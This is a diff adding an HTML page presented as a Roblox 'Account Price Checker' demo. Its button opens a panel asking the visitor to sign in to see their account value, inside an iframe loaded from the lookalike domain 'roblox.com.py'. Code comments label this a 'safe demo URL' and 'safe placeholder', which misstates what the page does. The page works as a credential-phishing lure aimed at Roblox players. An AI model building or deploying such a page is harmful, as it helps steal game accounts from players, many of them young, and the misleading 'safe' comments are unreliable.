@@ -1,0 +1,202 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Account Price Checker Demo</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+  body {
+    margin:0;
+    font-family: Arial,sans-serif;
+    background: linear-gradient(180deg,#061018,#081523);
+    color:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    padding:20px;
+    box-sizing:border-box;
+    position:relative;
+    overflow:hidden;
+  }
+
+  /* Roblox-style "R" symbol background */
+  body::before {
+    content:"R";
+    position:absolute;
+    font-family: 'Press Start 2P', cursive;
+    font-size:500px;
+    color: rgba(255,215,0,0.05);
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%) rotate(-15deg);
+    pointer-events:none;
+    user-select:none;
+    z-index:0;
+  }
+
+  .container {
+    width:800px;
+    text-align:center;
+    display:flex;
+    flex-direction:column;
+    gap:20px;
+    position:relative;
+    z-index:1; /* above background R */
+  }
+
+  h1 {
+    font-family: 'Press Start 2P', cursive;
+    font-size:22px;
+    color:#ffd700;
+    margin-bottom:12px;
+    text-shadow:0 2px 4px #000;
+  }
+
+  .panel {
+    background: linear-gradient(180deg,#0b1018,#0f1724);
+    border:3px solid #ffd700;
+    border-radius:16px;
+    padding:24px;
+    box-shadow:0 12px 30px rgba(0,0,0,0.5);
+  }
+
+  .bigbtn {
+    background:linear-gradient(180deg,#d32f2f,#b82626);
+    border:0;
+    color:#fff;
+    font-weight:bold;
+    font-size:16px;
+    padding:18px 32px;
+    border-radius:12px;
+    cursor:pointer;
+    box-shadow:0 12px 30px rgba(216,50,50,0.3);
+    text-transform:uppercase;
+  }
+
+  .bigbtn:hover {box-shadow:0 16px 36px rgba(216,50,50,0.5);}
+
+  .iframe-view {display:none;flex-direction:column;gap:12px;align-items:center;}
+
+  .iframe-wrapper {
+    background:#000;
+    border:3px solid #ffd700;
+    border-radius:12px;
+    overflow:hidden;
+    width:600px;
+    height:400px;
+    margin:0 auto;
+    box-shadow:0 8px 20px rgba(0,0,0,0.4);
+  }
+
+  iframe {width:100%;height:100%;border:0;background:#000;}
+
+  .placeholder-text {
+    margin:8px 0;
+    font-size:14px;
+    color:#ccc;
+  }
+
+  .back-btn {
+    background:linear-gradient(180deg,#555,#333);
+    border:0;
+    color:#fff;
+    font-weight:bold;
+    font-size:14px;
+    padding:12px 24px;
+    border-radius:10px;
+    cursor:pointer;
+    box-shadow:0 8px 20px rgba(0,0,0,0.3);
+    margin-top:12px;
+  }
+
+  .back-btn:hover {box-shadow:0 12px 28px rgba(0,0,0,0.5);}
+
+  /* Retro rolling 0 animation */
+  .price-display {
+    font-family:'Press Start 2P',cursive;
+    font-size:32px;
+    color:#ffd700;
+    margin-bottom:12px;
+    display:flex;
+    justify-content:center;
+    gap:6px;
+  }
+
+  .digit {
+    display:inline-block;
+    animation: roll 0.8s infinite linear;
+  }
+
+  @keyframes roll {
+    0% {transform: translateY(0);}
+    25% {transform: translateY(-10px);}
+    50% {transform: translateY(10px);}
+    75% {transform: translateY(-5px);}
+    100% {transform: translateY(0);}
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- Initial button view -->
+    <div id="buttonView" class="panel">
+      <h1>Account Price Checker</h1>
+      <p>Click the button below to open the detailed checker view.</p>
+      <button class="bigbtn" id="openCheckerBtn">ACCOUNT PRICE CHECKER</button>
+      <div class="placeholder-text">Click the button to be directed to our group joining is completely voluntarily but appreciated.</div>
+    </div>
+
+    <!-- Iframe view -->
+    <div id="iframeView" class="iframe-view panel">
+      <div class="placeholder-text">Join the group for access to our account pricer</div>
+
+      <!-- Retro price display -->
+      <div class="price-display">
+        <span>£</span>
+        <span class="digit">0</span>
+        <span class="digit">0</span>
+        <span class="digit">.</span>
+        <span class="digit">0</span>
+      </div>
+
+      <!-- Safe placeholder sign-in text -->
+      <div style="font-size:14px;color:#ccc;margin-bottom:8px;">
+         Sign in to view your account value.
+      </div>
+
+      <div class="iframe-wrapper">
+        <iframe id="demoIframe" src=""></iframe>
+      </div>
+
+      <div class="placeholder-text">Join he group for updates and more usefull tools that we give you for free</div>
+      <button class="back-btn" id="backBtn">BACK</button>
+    </div>
+
+  </div>
+
+<script>
+  const buttonView = document.getElementById('buttonView');
+  const iframeView = document.getElementById('iframeView');
+  const openBtn = document.getElementById('openCheckerBtn');
+  const backBtn = document.getElementById('backBtn');
+  const iframe = document.getElementById('demoIframe');
+
+  openBtn.addEventListener('click', () => {
+    buttonView.style.display = 'none';
+    iframeView.style.display = 'flex';
+    // Replace with your safe demo URL
+    iframe.src = 'https://roblox.com.py/communities/5965990673/';
+  });
+
+  backBtn.addEventListener('click', () => {
+    iframeView.style.display = 'none';
+    buttonView.style.display = 'block';
+    iframe.src = '';
+  });
+</script>
+</body>
+</html>
